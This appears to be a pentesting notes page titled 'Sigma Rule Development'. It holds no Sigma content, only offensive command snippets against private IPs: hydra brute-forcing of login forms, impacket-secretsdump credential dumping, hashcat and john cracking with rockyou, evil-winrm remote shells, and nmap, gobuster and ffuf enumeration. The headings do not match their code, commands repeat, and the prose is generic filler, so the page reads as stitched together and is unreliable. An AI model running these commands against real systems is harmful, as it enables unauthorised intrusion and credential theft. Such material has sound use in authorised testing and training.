---
TitleSEO: "Sigma Rule Development | ZureFX"
TitlePost: "Sigma Rule Development"
Author: "ZureFX"
Description: "Personal notes on Sigma Rule Development. Quick reference for pentesting and CTF challenges."
Keywords: "lateral movement, privilege escalation, dfir, oscp, enumeration"
URL: "https://zurefx.github.io/notes/note-sigma-rule-development-142.html"
URL_IMAGES: ""
Date: "2024-11-16"
Tags: "Lateral Movement, Privilege Escalation, DFIR, OSCP, Enumeration"
Section: "notes"
Lang: "en"
main_img: "note-sigma-rule-development-142"
Permalink: "/notes/note-sigma-rule-development-142.html"
BtnLabel: "Read Notes"
Pick: 0
---
## CMD

### MSSQL

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.125.5.127
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

> **Note:** Docker Escape was identified as the primary attack vector in this scenario.

```bash
gobuster dir -u http://10.82.166.124/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.46.155.15/FUZZ
```

## SeImpersonatePrivilege

### PowerShell

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.126.251.34 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.60.94.188/FUZZ
evil-winrm -i 10.125.193.198 -u administrator -p 'P@ssw0rd!'
```

```python
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.29.20.139/FUZZ
nmap -sCV -p9200,3268,27017 10.54.65.82 -oN scan.txt
nmap -sCV -p22,143,5986 10.124.232.152 -oN scan.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file.

The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

## atexec

### socat

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.34.38.122 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.49.115.189/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.19.177.171 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

- `Weak Service Permissions`
- `socat`
- `Unquoted Service Path`
- `Cron Job`
- `msfvenom`
- `gobuster`
